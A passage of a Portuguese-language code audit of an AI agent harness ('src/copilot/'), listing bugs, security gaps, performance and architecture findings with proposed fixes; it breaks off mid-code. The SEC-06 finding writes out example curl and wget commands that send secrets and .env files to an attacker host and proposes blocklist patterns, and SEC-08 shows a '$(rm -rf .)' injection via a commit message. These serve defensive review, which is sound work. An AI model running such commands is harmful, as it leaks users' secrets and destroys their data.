# Auditoria Técnica — `src/copilot/` — 2026

**Escopo:** todos os ~90 arquivos em `src/copilot/` **Sessões de leitura:** 4 (leitura exaustiva,
cobertura ~85%+ do código) **Data:** 2026-07-09 **Metodologia:** leitura linha-a-linha, análise
semântica, inspeção de fluxo

---

## Convenções

| Campo          | Significado                       |
| -------------- | --------------------------------- |
| **ID**         | Identificador único do achado     |
| **Severidade** | crítico / alto / médio / baixo    |
| **Arquivo**    | Caminho relativo a `src/copilot/` |
| **Linha**      | Linha aproximada (±10)            |

---

## Categoria BUG

### BUG-01 — `routes/client.js`: `/client/force-stop` bypassa limpeza de registry

**Severidade:** alto **Arquivo:** `routes/client.js` **Linha:** ~80 **Descrição:** O endpoint
`POST /client/force-stop` chama `client.forceStop()` diretamente no objeto `CopilotClient`, em vez
de chamar `forceStopClient()` exportada de `lib/client.js`. A função `forceStopClient()` além de
parar o cliente, limpa o registro de sessão ativa no singleton de gerenciamento e faz
garbage-collect de listeners. Ao contornar essa função, o estado do registry fica inconsistente:
após um force-stop, o registro ainda aponta para a sessão morta, e novas chamadas a `getClient()`
podem tentar retomar uma sessão que o SDK já descartou.

**Proposta de correção:**

```js
// Antes:
await client.forceStop();
// Depois:
await forceStopClient(); // importar forceStopClient de lib/client.js
```

---

### BUG-02 — `config/custom-agents.js`: `SDK_AGENTS` definida mas nunca exportada (código morto)

**Severidade:** baixo **Arquivo:** `config/custom-agents.js` **Linha:** ~50 **Descrição:** O array
`SDK_AGENTS` (contendo definições dos agentes `task`, `explore`, `diagnostic`) é declarado interno
ao módulo mas nunca exportado. Nenhum outro arquivo importa esse símbolo. É código morto que pode
criar confusão sobre qual é a lista canônica de agentes SDK.

**Proposta de correção:** Exportar `SDK_AGENTS` se pretendido, ou removê-lo junto de um comentário
explicando por que os agentes SDK são definidos apenas em `BUILTIN_AGENTS` ou similar.

---

### BUG-03 — `lib/models.js` `buildReasoningConfig()`: passa `reasoningEffort` inválido sem validação

**Severidade:** médio **Arquivo:** `lib/models.js` **Linha:** ~150 **Descrição:** Quando o modelo
solicitado não é encontrado na lista cacheada (e.g., cache expirou e `listModels()` falhou),
`buildReasoningConfig()` retorna `{ model: modelId, reasoningEffort: effort }` sem verificar se
`effort` é um valor aceito pelo SDK. O SDK pode lançar erro interno ou ignorar silenciosamente o
valor, levando a comportamento inesperado em sessões de raciocínio.

**Proposta de correção:**

```js
const VALID_EFFORTS = new Set(['low', 'medium', 'high']);
if (!VALID_EFFORTS.has(effort)) {
  throw new Error(`reasoningEffort '${effort}' inválido. Valores aceitos: low, medium, high.`);
}
```

---

### BUG-04 — `llm-a-conversation.mjs`: contagem hardcoded `tools=30` no log

**Severidade:** baixo **Arquivo:** `llm-a-conversation.mjs` **Linha:** ~30 **Descrição:**
`console.log('tools=30')` imprime uma contagem hardcoded que ficou desatualizada. O número real de
tools registradas pode ser diferente, tornando o diagnóstico impreciso.

**Proposta de correção:**

```js
console.log(`tools=${tools.length}`);
```

---

### BUG-05 — `llm-a-conversation.mjs`: `turn_item` sombreia função `turn`

**Severidade:** baixo **Arquivo:** `llm-a-conversation.mjs` **Linha:** ~70 **Descrição:** O callback
de `bridge.history.forEach(turn_item, ...)` declara `turn_item` como nome do parâmetro, sombreando o
nome da função `turn` definida no escopo externo. Embora não cause erro em runtime imediato (pela
diferença de nome: `turn_item` vs `turn`), o padrão é confuso. Se alguém renomear o parâmetro para
`turn`, causará shadow silencioso da função exterior.

**Proposta de correção:** Renomear o parâmetro do callback para `historyItem` ou `entry` para
eliminar o risco de shadow.

---

### BUG-06 — `channel/audit.js` + `agent/session-manager.js`: dois escritores no mesmo `logs/tool-audit.jsonl`

**Severidade:** médio **Arquivo:** `channel/audit.js`, `agent/session-manager.js` **Linha:** N/A
**Descrição:** Ambos os módulos abrem e escrevem em `logs/tool-audit.jsonl` via `appendFileSync`. Em
processos concorrentes (ou até no mesmo processo com I/O rápido), as escritas podem se entrelaçar,
corrompendo linhas JSONL. Não há mecanismo de lock ou serialização entre os dois escritores.

**Proposta de correção:** Centralizar todas as escritas de audit em `channel/audit.js`, expondo uma
função `logAuditEntry(entry)` que `session-manager.js` chama. Alternativamente, usar um
`WritableStream` sequencial com lock interno.

---

### BUG-07 — `conversation-hub/store.js`: migração FTS5 descarta tabela sem remover triggers

**Severidade:** médio **Arquivo:** `conversation-hub/store.js` **Linha:** ~80 (função
`migrateFts5Tokenizer`) **Descrição:** A migração que re-cria a tabela FTS5 com novo tokenizer
executa `DROP TABLE IF EXISTS fts_memories` antes de recriar. Entretanto, os triggers que populam a
tabela FTS (`memories_ai`, `memories_au`, `memories_ad`) não são removidos antes. O SQLite permite
triggers órfãos que apontam para tabelas inexistentes, e eles disparam silenciosamente falhando
quando a tabela não existe. Na nova criação, novos triggers são criados, mas os antigos orphans
permanecem com risco de colisão de nomes em alguns cenários.

**Proposta de correção:**

```sql
DROP TRIGGER IF EXISTS memories_ai;
DROP TRIGGER IF EXISTS memories_au;
DROP TRIGGER IF EXISTS memories_ad;
DROP TABLE IF EXISTS fts_memories;
-- depois recria tabela e triggers
```

---

### BUG-08 — `channel/inject.js`: `throw` após loop de retry é código inacessível

**Severidade:** baixo **Arquivo:** `channel/inject.js` **Linha:** ~120 **Descrição:** Após o loop de
retry (3 tentativas com backoff linear), o código tem um `throw new BridgeError(...)` que nunca é
alcançado porque o loop já `return`s com o último erro antes de sair. O `throw` fica como dead code,
escondendo a intenção de sempre propagar o erro.

**Proposta de correção:** Remover o `return` da última iteração do loop para que o `throw` seja
alcançado, ou substituir pela lógica explícita de relançar após o loop.

---

### BUG-09 — `tools/git/index.js` `gitCommitTool`: falha em `git add` não impede commit

**Severidade:** médio **Arquivo:** `tools/git/index.js` **Linha:** ~100 **Descrição:** Quando
`all=true`, o handler chama `safeGit('git add -A')` mas não verifica o código de saída. Se o
`git add` falhar (e.g., lock do index, permissões), o código segue para o check de
`git diff --cached --name-only`. Como nenhum arquivo foi staged, o check retorna "nada staged" e o
handler reporta falha — mas a mensagem de erro não menciona a falha de `git add`, dificultando o
diagnóstico.

**Proposta de correção:**

```js
if (all) {
  const addResult = safeGit('git add -A');
  if (addResult.exitCode !== 0) {
    return { success: false, output: '', error: `git add -A falhou: ${addResult.error}` };
  }
}
```

---

### BUG-10 — `tools/session-tools.js` `set_session_context`: `SESSION_CONTEXT_STORE` vaza entre sessões

**Severidade:** médio **Arquivo:** `tools/session-tools.js` **Linha:** ~90 **Descrição:**
`SESSION_CONTEXT_STORE` é um `Map` no escopo do módulo. Em processos de longa duração onde o
`AlwaysAliveAgent` é reiniciado várias vezes sem restart do processo, o store cresce indefinidamente
e os dados de sessões anteriores ficam acessíveis à sessão ativa. Isso pode expor contexto de
conversas anteriores indevidamente.

**Proposta de correção:** Expor uma função `clearSessionContext()` e chamar no lifecycle do agente
ao iniciar nova sessão. Ou usar o `sessionId` como key de particionamento no store.

---

### BUG-11 — `hook-tools.js` `request_user_input`: suspensão não é real

**Severidade:** alto **Arquivo:** `tools/hook-tools.js` **Linha:** ~130 **Descrição:** O handler de
`request_user_input` retorna `{ status: 'waiting_for_input' }` imediatamente sem realmente suspender
a execução do SDK. A suspensão real do SDK ocorre apenas quando o modelo usa a built-in `ask_user`
tool, que aciona o callback `onUserInputRequest`. Uma ferramenta custom não tem esse poder: o SDK
não suspende automaticamente ao ver um tool result arbitrário. Portanto, após o modelo invocar
`request_user_input`, ele recebe a resposta imediata e pode continuar gerando output sem esperar o
usuário.

**Proposta de correção:** Integrar explicitamente com o mecanismo de suspensão: o handler deve
publicar a pergunta no canal interno e retornar uma Promise que aguarda `POST /api/copilot/answer`
via o AlwaysAliveAgent. Ou documentar claramente que a suspensão depende do SYSTEM PROMPT instruindo
o modelo a parar após ver `status: 'waiting_for_input'` (abordagem frágil baseada em instrução, não
em mecanismo robusto).

---

### BUG-12 — `agent/always-alive.js` `start()`: sem proteção contra chamadas concorrentes

**Severidade:** médio **Arquivo:** `agent/always-alive.js` **Linha:** ~300 **Descrição:** O guarda
`if (this.#status !== 'stopped') return` protege contra início quando o agente já está `starting` ou
`running`. Porém, há uma janela de race condition: se dois `await start()` chegarem quase
simultaneamente, ambos passam pelo check enquanto o status ainda é `'stopped'` (antes do
`#setStatus('starting')` da primeira chamada). Isso pode resultar em dois `CopilotClient` sendo
criados e duas sessões SDK sendo iniciadas.

**Proposta de correção:** Usar uma Promise de inicialização como mutex:

```js
#startingPromise = null;
async start() {
    if (this.#startingPromise) return this.#startingPromise;
    this.#startingPromise = this.#doStart().finally(() => { this.#startingPromise = null; });
    return this.#startingPromise;
}
```

---

### BUG-13 — `tools/code-tools.js` `lint_check` com `fix=true`: marcado como `withSkipPermission`

**Severidade:** médio **Arquivo:** `tools/code-tools.js` **Linha:** ~90 **Descrição:** A tool
`lint_check` é aplicada com `withSkipPermission(...)`, removendo a exigência de aprovação prévia do
usuário. Porém, quando chamada com `fix: true`, ela executa `npm run lint --fix` que **modifica
arquivos no workspace**. Uma operação que altera estado não deve ser marcada como skip-permission.

**Proposta de correção:** Separar em duas tools: `lint_check` (skipPermission: true, sem --fix) e
`lint_fix` (requiresApproval: true, com --fix).

---

## Categoria SEC

### SEC-01 — `config/mcp-servers.js`: `GITHUB_TOKEN` capturado em tempo de importação do módulo

**Severidade:** médio **Arquivo:** `config/mcp-servers.js` **Linha:** ~20 **Descrição:**
`process.env.GITHUB_TOKEN` é lido e interpolado no objeto de configuração MCP quando o módulo é
primeiro importado. Se o processo receber o token via injeção dinâmica de variáveis de ambiente
(e.g., via vault, rotação de credenciais em runtime), o valor fica stale. Além disso, o token fica
em memória em plaintext no objeto de configuração, acessível a qualquer inspeção de heap.

**Proposta de correção:** Ler `process.env.GITHUB_TOKEN` dentro de `buildMcpConfig()` (chamada em
runtime) em vez de no escopo do módulo. Isso garante que cada chamada use o token mais recente.

---

### SEC-02 — `conversation-hub/socket-ns.js` evento `user:inject`: sem validação de tamanho do payload

**Severidade:** alto **Arquivo:** `conversation-hub/socket-ns.js` **Linha:** ~90 **Descrição:** O
handler do evento Socket.io `user:inject` encaminha o payload diretamente ao hub sem verificar o
tamanho da string injetada. Um cliente pode enviar uma string de megabytes que é colocada na fila do
agente, processada pelo SDK (tokens custosos) e persistida no SQLite. Isso representa risco de DoS
por esgotamento de contexto e custo de tokens.

**Proposta de correção:**

```js
socket.on('user:inject', (data) => {
  const MAX_INJECT_BYTES = 8_192;
  if (typeof data?.message !== 'string' || Buffer.byteLength(data.message) > MAX_INJECT_BYTES) {
    socket.emit('error', { code: 'PAYLOAD_TOO_LARGE' });
    return;
  }
  // ... continua
});
```

---

### SEC-03 — `terminal/server.js` `readBody()`: sem limite de tamanho no corpo POST

**Severidade:** alto **Arquivo:** `terminal/server.js` **Linha:** ~40 **Descrição:** `readBody()`
acumula chunks do request body sem limite de tamanho. Um atacante local pode enviar um POST com
corpo de gigabytes ao servidor de injeção (porta 3009), causando esgotamento de memória do processo.

**Proposta de correção:**

```js
async function readBody(req, maxBytes = 65_536) {
  return new Promise((resolve, reject) => {
    let body = '';
    let size = 0;
    req.on('data', (chunk) => {
      size += chunk.length;
      if (size > maxBytes) {
        req.destroy();
        return reject(new Error('Payload too large'));
      }
      body += chunk;
    });
    req.on('end', () => resolve(body));
    req.on('error', reject);
  });
}
```

---

### SEC-04 — `terminal/server.js` `_injectRateLimiter`: Map cresce indefinidamente (memory exhaustion)

**Severidade:** médio **Arquivo:** `terminal/server.js` **Linha:** ~60 **Descrição:** O rate limiter
in-memory armazena `{ count, resetAt }` por IP no Map `_injectRateLimiter`. As entradas são
removidas apenas quando uma requisição chega e a janela expirou — se um IP faz apenas 1 requisição e
nunca mais, sua entrada permanece para sempre. Em produção com NAT ou scanners, o Map pode acumular
milhares de IPs expirados.

**Proposta de correção:** Adicionar limpeza periódica com `setInterval`:

```js
setInterval(() => {
  const now = Date.now();
  for (const [ip, entry] of _injectRateLimiter) {
    if (entry.resetAt <= now) _injectRateLimiter.delete(ip);
  }
}, 60_000).unref();
```

---

### SEC-05 — `tools/web-tools.js` `webFetchTool`: validação de redirect ocorre após a requisição

**Severidade:** médio **Arquivo:** `tools/web-tools.js` **Linha:** ~100 **Descrição:** A proteção
SSRF verifica o destino do redirect (`response.url`) _após_ `fetch()` retornar. Isso significa que o
servidor interno já recebeu e processou a requisição antes de ser detectado. A proteção só previne o
conteúdo de ser retornado ao modelo, mas não impede o side-effect de ter feito a requisição ao alvo
interno.

**Proposta de correção:** Desabilitar redirects automáticos (`redirect: 'manual'`) e verificar o
header `Location` antes de seguir manualmente. Alternativamente, usar um proxy ou módulo HTTP
especializado que inspeciona o destino de cada hop.

---

### SEC-06 — `tools/shell/index.js` `BLOCKED_COMMAND_PATTERNS`: exfiltração via `curl`/`wget` sem pipe

**Severidade:** alto **Arquivo:** `tools/shell/index.js` **Linha:** ~80 **Descrição:** O blocklist
de comandos proíbe `curl | bash` e `wget | bash` (code injection via pipe), mas não bloqueia
`curl https://attacker.com/exfil -d @/workspaces/secrets` ou
`wget --post-file=/workspaces/.env https://attacker.com`. Um modelo comprometido pode exfiltrar
qualquer arquivo legível via `curl`/`wget` sem pipe.

**Proposta de correção:** Adicionar padrões ao blocklist:

```js
/\bcurl\b.*https?:\/\/(?!localhost|127\.|::1)/i,  // curl para hosts externos
/\bwget\b.*https?:\/\/(?!localhost|127\.|::1)/i,  // wget para hosts externos
```

Ou, preferencialmente, usar whitelist de comandos em vez de blocklist.

---

### SEC-07 — `lib/permissions.js`: `denyPatterns` não se aplica a invocações sem `filePath`

**Severidade:** médio **Arquivo:** `lib/permissions.js` **Linha:** ~80 **Descrição:** Na avaliação
dos `denyPatterns` (passo 4 do handler), o check testa se `toolParams.filePath` bate com algum
padrão. Ferramentas de shell, HTTP ou introspection não têm `filePath` em seus parâmetros — portanto
os padrões de deny nunca se aplicam a elas, mesmo que os padrões fossem intencionais como restrição
ampla.

**Proposta de correção:** Se a intenção é bloquear invocações a determinados tools independente de
params, a API de `denyPatterns` deve aceitar também padrões de nome de tool além de caminhos de
arquivo.

---

### SEC-08 — `tools/git/index.js` `gitCommitTool`: mensagem interpolada em string de shell

**Severidade:** médio **Arquivo:** `tools/git/index.js` **Linha:** ~110 **Descrição:** A mensagem de
commit é passada via interpolação de string:
`` `git commit -m "${message.replace(/"/g, '\\"')}"` ``. O escape de `"` com `\"` não protege contra
sequências como `$()` ou backticks dentro da mensagem (que `execSync` interpretará via shell).
Exemplo: mensagem `$(rm -rf .)` em determinadas shells executará o subcomando.

**Proposta de correção:** Usar `execFile` com array de argumentos:

```js
import { execFileSync } from 'node:child_process';
execFileSync('git', ['commit', '-m', message], { cwd: ROOT, encoding: 'utf8' });
```

---

### SEC-09 — `terminal/http-handlers.js`: `writeFileSync` em caminho de handler HTTP (I/O síncrono bloqueante)

**Severidade:** médio **Arquivo:** `terminal/http-handlers.js` **Linha:** ~1 **Descrição:** O
arquivo importa `writeFileSync` de `node:fs` no início, indicando escrita síncrona em handlers HTTP.
Escritas síncronas em handlers bloqueiam o event loop, impedindo o processamento de outras
requisições durante a escrita — potencial DoS por requisições de memória concorrentes.

**Proposta de correção:** Substituir por `writeFile` (async) ou usar um stream de append com queue
interna.

---

## Categoria ARCH

### ARCH-01 — `conversation-hub/orchestrator.js`: `#inflightBySession` nunca limpado (memory leak)

**Severidade:** alto **Arquivo:** `conversation-hub/orchestrator.js` **Linha:** ~80 **Descrição:**
`#inflightBySession` é um `Map<sessionId, Promise>` que age como mutex por sessão. Cada nova sessão
adiciona uma entrada que nunca é removida após a sessão encerrar. Em longos uptimes com muitas
sessões, esse Map cresce indefinidamente.

**Proposta de correção:** Limpar a entrada após a Promise do mutex resolver:

```js
const next = (this.#inflightBySession.get(sessionId) ?? Promise.resolve())
  .then(doWork)
  .finally(() => {
    if (this.#inflightBySession.get(sessionId) === next) {
      this.#inflightBySession.delete(sessionId);
    }
  });
this.#inflightBySession.set(sessionId, next);
```

---

### ARCH-02 — `agent/entry.js`: delay fixo de 3s entre retries (sem backoff exponencial)

**Severidade:** baixo **Arquivo:** `agent/entry.js` **Linha:** ~60 **Descrição:** `startWithRetry()`
espera 3s entre cada uma das 5 tentativas, independente do tipo ou frequência de falhas. Se o
Copilot API estiver sobrecarregado, 5 tentativas a 3s aumentam a pressão. Backoff exponencial com
jitter é a abordagem padrão para resiliência.

**Proposta de correção:**

```js
const delay = Math.min(3000 * Math.pow(2, attempt - 1), 30_000);
const jitter = Math.random() * 1000;
await new Promise((r) => setTimeout(r, delay + jitter));
```

---

### ARCH-03 — `lib/client.js` `getClient()`: múltiplos callers concorrentes iniciam loops de retry paralelos

**Severidade:** médio **Arquivo:** `lib/client.js` **Linha:** ~50 **Descrição:** `getClient()` é um
padrão de inicialização lazy com retry. Se três módulos chamam `getClient()` simultaneamente antes
da primeira inicialização, cada um executa seu próprio loop de polling com backoff independente. O
resultado são 3 instâncias CopilotClient sendo criadas quase simultaneamente, com apenas a última
"ganhando" o estado singleton — as outras são criadas e descartadas, consumindo recursos
desnecessariamente.

**Proposta de correção:** Usar uma Promise singleton de inicialização:

```js
let _initPromise = null;
export async function getClient() {
  if (_client) return _client;
  if (!_initPromise)
    _initPromise = initClientWithRetry().finally(() => {
      _initPromise = null;
    });
  return _initPromise;
}
```

---

### ARCH-04 — `lib/session.js`: `mode: 'customize'` sem suporte, sem fallback claro

**Severidade:** baixo **Arquivo:** `lib/session.js` **Linha:** ~80 **Descrição:** Um comentário
`// TODO: mode:'customize' not supported in SDK v0.1.x` indica funcionalidade incompleta. O código
usa `mode: 'default'` como fallback sem logging ou aviso. Se o modo `customize` for necessário para
personalização do system prompt, a funcionalidade silenciosamente degradada pode passar
despercebida.

**Proposta de correção:** Adicionar log de aviso quando `customize` é solicitado mas não suportado,
documentar a limitação no JSDoc e criar um issue de tracking.

---

### ARCH-05 — Dois escritores paralelos no mesmo arquivo de audit (`channel/audit.js` + `agent/session-manager.js`)

**Severidade:** médio **Arquivo:** `channel/audit.js`, `agent/session-manager.js` **Linha:** N/A
**Descrição:** Dois módulos independentes usam `appendFileSync` no mesmo arquivo
`logs/tool-audit.jsonl`. Embora `appendFileSync` seja atômico a nível de syscall em sistemas POSIX
para writes pequenos, não há garantia de serialize de linhas JSON completas — especialmente em
escritas maiores. O design viola o princípio de single-writer.

**Proposta de correção:** Criar um módulo `audit-writer.js` centralizado com fila interna e
single-writer pattern. Expor `appendAudit(entry)` para todos os consumidores.

---

### ARCH-06 — `tools/task-tools.js` `get_session_state`: dynamic imports desnecessários em cada chamada

**Severidade:** baixo **Arquivo:** `tools/task-tools.js` **Linha:** ~160 **Descrição:** O handler de
`get_session_state` usa `await import('node:fs')`, `await import('node:path')` e
`await import('node:url')` em cada invocação da tool. Módulos Node built-in são cacheados pelo
runtime, mas a overhead de resolução + cache-lookup é desnecessária quando se pode importar estático
no topo do arquivo.

**Proposta de correção:** Mover os imports para o topo do script como imports estáticos.

---

### ARCH-07 — `terminal/dialog.js` `broadcastSse`: dual-emit sem deduplicação

**Severidade:** baixo **Arquivo:** `terminal/dialog.js` **Linha:** ~100 **Descrição:**
`broadcastSse()` emite o evento tanto para clientes SSE (via response stream) quanto para o
namespace Socket.io. Se um cliente front-end estiver conectado via Socket.io e também polling SSE,
receberá o mesmo evento duplicado.

**Proposta de correção:** Documentar claramente que os dois canais são mutuamente exclusivos (SSE
para clientes HTTP, Socket.io para clientes WebSocket) e adicionar validação que impede dupla
subscrição do mesmo cliente nos dois canais.

---

### ARCH-08 — `introspection-tools.js`: `_registeredTools` e `_telemetryStore` são singletons de módulo

**Severidade:** baixo **Arquivo:** `tools/introspection-tools.js` **Linha:** ~30 **Descrição:** As
variáveis de estado compartilhado são module-level. Em um ambiente de testes ou multi-instância onde
o módulo é re-usado entre processos (worker threads), o estado persiste entre sessões e pode expor
telemetria de sessões anteriores.

**Proposta de correção:** Encapsular em uma factory `createIntrospection(tools, telemetryStore)` que
retorna as tools configuradas com closure sobre o estado local.

---

## Categoria PERF

### PERF-01 — `agent/webhook-manager.js`: `import('node:http'/'node:https')` dinâmico por emit

**Severidade:** baixo **Arquivo:** `agent/webhook-manager.js` **Linha:** ~50 **Descrição:** Cada
webhook emit executa `await import('node:http')` ou `await import('node:https')`. Embora o Node.js
cache esses módulos após a primeira importação, a overhead de resolução assíncrona acumula em
eventos de alta frequência.

**Proposta de correção:** Importar `http` e `https` como imports estáticos no topo do arquivo.

---

### PERF-02 — `channel/audit.js` + `agent/session-manager.js`: `appendFileSync`/`writeFileSync` no event loop principal

**Severidade:** médio **Arquivo:** `channel/audit.js`, `agent/session-manager.js` **Linha:** N/A
**Descrição:** Escritas síncronas em arquivo bloqueiam o event loop do Node.js. Em cenários de alta
frequência de invocação de tools (múltiplas sessões ativas), cada tool invocation adiciona uma
escritura síncrona ao critical path, aumentando latência de resposta.

**Proposta de correção:** Usar `fs.appendFile` (async) com uma fila interna de pending writes, ou
usar `WritableStream` com `pipeline` para batching automático.

---

### PERF-03 — `config/tools/registry.js` + `config/tools/state.js` + `bridges/alias-store.js`: escritas síncronas por mutação sem debounce

**Severidade:** médio **Arquivo:** `config/tools/registry.js`, `config/tools/state.js`,
`bridges/alias-store.js` **Linha:** N/A **Descrição:** Cada mutação (registrar tool, patch config,
salvar alias) dispara um `writeFileSync` imediato. Em operações em lote (e.g., carregar 20 aliases
de uma vez), isso gera 20 escritas síncronas consecutivas.

**Proposta de correção:** Implementar debounce de 200-500ms antes de cada escrita:

```js
let _saveTimer = null;
function scheduleSave(store) {
  clearTimeout(_saveTimer);
  _saveTimer = setTimeout(() => saveStoreAsync(store), 300);
}
```

---

### PERF-04 — `tools/code-tools.js`: `execSync` bloqueia event loop durante lint/test (até 120s)

**Severidade:** alto **Arquivo:** `tools/code-tools.js` **Linha:** ~30 **Descrição:** `safeExec()`
usa `execSync` com timeouts de até 120s. Durante esse período, o event loop do processo fica
completamente bloqueado: nenhuma requisição HTTP, SSE, Socket.io ou agendamento de Promise pode ser
processado.

**Proposta de correção:** Substituir por `execFileAsync` (promisify de `execFile`) ou `spawn` com
streaming, que não bloqueiam o event loop.

---

### PERF-05 — `terminal/file-context.js`: cache sem limite de entradas (crescimento ilimitado)

**Severidade:** baixo **Arquivo:** `terminal/file-context.js` **Linha:** ~60 **Descrição:** O cache
`_fileCache` usa TTL de 30s mas não tem limite de capacidade. Em sessões longas com referência a
centenas de arquivos únicos, o cache pode acumular megabytes em memória sem nunca ser evictado
(entradas expiradas só são removidas quando re-acessadas).

**Proposta de correção:** Implementar evicção LRU com tamanho máximo (ex: 100 entradas ou 10MB
total) ou adicionar limpeza periódica de entradas expiradas.

---

### PERF-06 — `terminal/workspace-context.js` `getWorkspaceContext()`: fork de 2 processos por chamada sem cache

**Severidade:** baixo **Arquivo:** `terminal/workspace-context.js` **Linha:** ~70 **Descrição:**
Cada chamada a `getWorkspaceContext()` executa até 2 `execSync` (`git rev-parse --show-toplevel` e
`git rev-parse --abbrev-ref HEAD`). Se chamada frequentemente (e.g., em cada `handleGetContext()`
via HTTP), gera overhead de fork.

**Proposta de correção:** Cache com TTL de 5s:

```js
let _wsCache = null;
let _wsCacheExpiry = 0;
export function getWorkspaceContext() {
  if (_wsCache && Date.now() < _wsCacheExpiry) return _wsCache;
  _wsCache = computeWorkspaceContext();
  _wsCacheExpiry = Date.now() + 5_000;
  return _wsCache;
}
```

---

## Categoria GAP

### GAP-01 — `hook-tools.js` `request_user_input`: não é o mecanismo real de suspensão do SDK

**Severidade:** alto **Arquivo:** `tools/hook-tools.js` **Linha:** ~130 **Descrição:** A tool
`request_user_input` tem como intenção declarada ser o "equivalente ao vscode_askQuestions para
LLM-B", mas não usa o mecanismo real do SDK de suspensão (`ask_user` built-in que aciona
`onUserInputRequest`). O handler retorna imediatamente, e o modelo pode ignorar o
`status: 'waiting_for_input'` e continuar gerando output. A arquitetura depende do model compliance
com o system prompt, não de um mecanismo de enforcement real.

**Proposta de correção:** Registrar a tool como um wrapper do `ask_user` nativo, ou implementar uma
Promise de suspensão real que resolve somente quando `POST /api/copilot/answer` é chamado, usando o
mecanismo `onUserInputRequest` do agente.

---

### GAP-02 — `lib/hooks.js`: sem modo deny-by-default (lista vazia = allow-all)

**Severidade:** médio **Arquivo:** `lib/hooks.js` **Linha:** ~60 **Descrição:**
`resolveToolDecision()` trata `allowTools: []` (vetor vazio) como "sem restrição" (allow all). Não
existe forma de criar um handler que nega todas as tools por padrão e require allow-list explícita.
Para implementar allowlist estrita, o chamador precisa popular `allowTools` com todos os tools
desejados — qualquer omissão acidental resulta em allow-all.

**Proposta de correção:** Adicionar flag `strictAllowList: boolean` que, quando true, trata
`allowTools: []` como "deny all":

```js
if (options.strictAllowList && (!allowTools || allowTools.length === 0)) {
  return { decision: 'deny', reason: 'Strict allow list mode: no tools allowed by default' };
}
```

---

### GAP-03 — `tools/todo-tools.js` `generateId()`: sem criptografia (colisão possível)

**Severidade:** baixo **Arquivo:** `tools/todo-tools.js` **Linha:** ~110 **Descrição:**
`Math.random().toString(36).slice(2, 10)` gera IDs de 8 chars alfanuméricos com apenas ~41 bits de
entropia (Math.random usa Xorshift64). Em operações em lote com centenas de tarefas, a probabilidade
de colisão aumenta. O SQLite detectaria a colisão (PK violation), mas retornaria erro ao invés de
criar a tarefa.

**Proposta de correção:**

```js
import { randomBytes } from 'node:crypto';
function generateId() {
  return randomBytes(4).toString('hex'); // 8 chars hex, 32 bits de entropia criptográfica
}
```

---

### GAP-04 — `tools/introspection-tools.js` `list_tools`: mapa de categorias hardcoded e desatualizado

**Severidade:** baixo **Arquivo:** `tools/introspection-tools.js` **Linha:** ~90 **Descrição:** O
filtro por categoria usa um `prefixMap` hardcoded que não inclui categorias como `hub`, `web`,
`todo`, `file`, `shell`, `rpc`. Consultas com `category: 'hub'` retornam lista vazia mesmo existindo
hub_tools registradas.

**Proposta de correção:** Tornar o sistema de categorias data-driven: adicionar campo `category` em
`BuildToolOptions` e filtrar pelo campo em vez de por prefixo de nome.

---

### GAP-05 — `tools/session-rpc-tools.js` `_rpc`: sem isolamento por sessão

**Severidade:** médio **Arquivo:** `tools/session-rpc-tools.js` **Linha:** ~25 **Descrição:** `_rpc`
é uma variável module-level. Se o `AlwaysAliveAgent` for reiniciado e `setSessionRpc()` for chamado
com um novo handle, a sessão anterior perde seu RPC. Mais crítico: se existirem duas instâncias do
agente no mesmo processo (e.g., teste de integração), a segunda sobrescreve o RPC da primeira.

**Proposta de correção:** Passar o `rpc` como parâmetro para cada tool via closure, ou usar uma
factory que retorna tools já vinculadas à session específica.

---

### GAP-06 — `tools/shell/index.js` `ALLOWED_NPM_SCRIPTS`: whitelist desatualizada

**Severidade:** baixo **Arquivo:** `tools/shell/index.js` **Linha:** ~70 **Descrição:**
`ALLOWED_NPM_SCRIPTS` não inclui scripts como `git:safe-push`, `terminal:llm-b`, `rag:health`,
`lsp:health`, e outros presentes no `package.json`. Qualquer tentativa de executar esses scripts via
`run_npm_script` falha com "script não permitido", bloqueando operações legítimas.

**Proposta de correção:** Revisar e sincronizar `ALLOWED_NPM_SCRIPTS` com os scripts em
`package.json`, ou carregar a lista dinamicamente a partir do `package.json` na inicialização.

---

### GAP-07 — `routes/sessions.js`: parâmetro `provider` BYOK sem validação contra lista de providers permitidos

**Severidade:** médio **Arquivo:** `routes/sessions.js` **Linha:** ~100 **Descrição:** O endpoint
`POST /sessions` aceita `provider` no corpo da requisição para BYOK (Bring Your Own Key). O valor é
repassado ao SDK sem validação contra uma lista de providers conhecidos (ex: `openai`, `anthropic`,
`azure`). Um valor inválido causa erro do SDK com mensagem opaca, dificultando diagnóstico, e pode
expor comportamento interno do SDK em mensagens de erro.

**Proposta de correção:**

```js
const ALLOWED_PROVIDERS = new Set(['openai', 'anthropic', 'azure', 'google']);
if (provider && !ALLOWED_PROVIDERS.has(provider)) {
  return res.status(400).json({ error: `Provider inválido: ${provider}` });
}
```

---

### GAP-08 — `conversation-hub/orchestrator.js`: mutex `#inflightBySession` sem detecção de stall

**Severidade:** médio **Arquivo:** `conversation-hub/orchestrator.js` **Linha:** ~90 **Descrição:**
O mutex por sessão não tem timeout. Se uma Promise de turno travar (network hang, SDK timeout sem
throw), o slot do mutex fica locked indefinidamente. Todos os turnos subsequentes dessa sessão ficam
na fila esperando para sempre.

**Proposta de correção:** Envolver a Promise do turno com um timeout explícito:

```js
const withTimeout = (p, ms) =>
  Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error('turn timeout')), ms))]);
```

---

## Categoria QUAL

### QUAL-01 — `lib/telemetry.js`: usa `Array.prototype.findLast()` sem documentar Node 18+

**Severidade:** baixo **Arquivo:** `lib/telemetry.js` **Linha:** ~80 **Descrição:**
`Array.prototype.findLast()` foi introduzido no Node.js 18. O `package.json` pode especificar `>=20`
mas não está explicitado no módulo. Se alguém tentar usar em Node 16, receberá
`TypeError: toolCalls.findLast is not a function` sem mensagem clara.

**Proposta de correção:** Adicionar `// Requires Node.js >= 18` no JSDoc do arquivo, ou usar um
polyfill:

```js
const findLast = (arr, pred) => [...arr].reverse().find(pred);
```

---

### QUAL-02 — `terminal/dialog.js` `BOOT_PROMPT`: leitura de env var apenas em módulo init

**Severidade:** baixo **Arquivo:** `terminal/dialog.js` **Linha:** ~30 **Descrição:** `BOOT_PROMPT`
é exportado como constante calculada em tempo de importação do módulo:
`process.env.LLM_B_BOOT_PROMPT ?? DEFAULT_BOOT`. Mudanças na variável de ambiente após carregamento
do módulo são ignoradas. Isso impede override em runtime sem restart.

**Proposta de correção:** Transformar em getter ou ler a variável dentro de `ensureDialogLoop()`:

```js
export function getBootPrompt() {
